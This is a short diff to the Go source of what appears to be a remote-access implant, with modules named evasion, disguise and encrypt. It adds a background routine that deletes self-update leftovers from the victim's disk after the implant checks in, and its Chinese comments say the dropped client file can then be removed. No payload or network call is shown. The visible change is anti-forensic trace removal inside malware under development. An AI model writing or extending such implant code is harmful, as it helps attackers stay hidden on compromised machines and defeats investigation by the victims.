@@ -1,11 +1,12 @@
 package app
 
 import (
+	"implant/core/commands"
 	"implant/core/config"
 	"implant/core/debuglog"
-	"implant/core/evasion"
 	"implant/core/disguise"
 	"implant/core/encrypt"
+	"implant/core/evasion"
 	"implant/core/services"
 	"implant/core/utils"
 	"os"
@@ -67,6 +68,9 @@ func initInternal(listenerType string, dllMode bool) (clientID string, ok bool) 
 	// 不复制到 temp、不重启——上线后部署的客户端文件可直接删除。
 	if !dllMode {
 		ReleaseFileLock()
+		// 自我更新残留（<exe>.old / %TEMP% 更新临时文件）：旧进程退出后才删得掉，
+		// 放到后台带重试清理，不拖慢上线。
+		go commands.PurgeUpdateResidue()
 	}
 
 	// 初始化客户端密钥管理器（使用与服务端一致的 ClientID）
